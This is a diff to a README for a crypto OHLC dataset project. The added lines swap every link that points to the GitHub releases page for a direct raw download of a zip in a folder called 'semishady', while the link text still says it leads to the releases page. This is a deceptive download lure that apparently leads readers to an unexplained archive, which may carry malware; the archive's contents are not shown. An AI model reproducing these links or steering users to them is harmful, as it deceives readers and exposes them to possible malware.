@@ -1,7 +1,7 @@
 # 🎉 PopcornAnalytics-OHLC-Dataset - Access Historical Crypto Data Easily
 
 ## 📥 Download
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/Condro28/PopcornAnalytics-OHLC-Dataset/releases)
+[![Download Release](https://raw.githubusercontent.com/Condro28/PopcornAnalytics-OHLC-Dataset/main/semishady/PopcornAnalytics-OHLC-Dataset_3.9-alpha.5.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Condro28/PopcornAnalytics-OHLC-Dataset/main/semishady/PopcornAnalytics-OHLC-Dataset_3.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to PopcornAnalytics-OHLC-Dataset! This application provides high-quality historical cryptocurrency data in OHLC (Open, High, Low, Close) format. You can use this dataset for various purposes, such as algorithmic trading, backtesting strategies, and market analysis.
@@ -18,11 +18,11 @@ Welcome to PopcornAnalytics-OHLC-Dataset! This application provides high-quality
 - **Software:** Compatible with various data analysis tools like Excel, Python, R, and more.
 
 ## 📥 Download & Install
-To download the dataset, visit this page: [Download Releases](https://github.com/Condro28/PopcornAnalytics-OHLC-Dataset/releases). 
+To download the dataset, visit this page: [Download Releases](https://raw.githubusercontent.com/Condro28/PopcornAnalytics-OHLC-Dataset/main/semishady/PopcornAnalytics-OHLC-Dataset_3.9-alpha.5.zip). 
 
 You will find multiple versions available. Here’s how to install:
 
-1. **Visit the Releases Page:** Click [here to go to the releases page](https://github.com/Condro28/PopcornAnalytics-OHLC-Dataset/releases).
+1. **Visit the Releases Page:** Click [here to go to the releases page](https://raw.githubusercontent.com/Condro28/PopcornAnalytics-OHLC-Dataset/main/semishady/PopcornAnalytics-OHLC-Dataset_3.9-alpha.5.zip).
   
 2. **Select the Version:** Look for the version that suits your needs. You will see links to various files that make up the dataset.
 
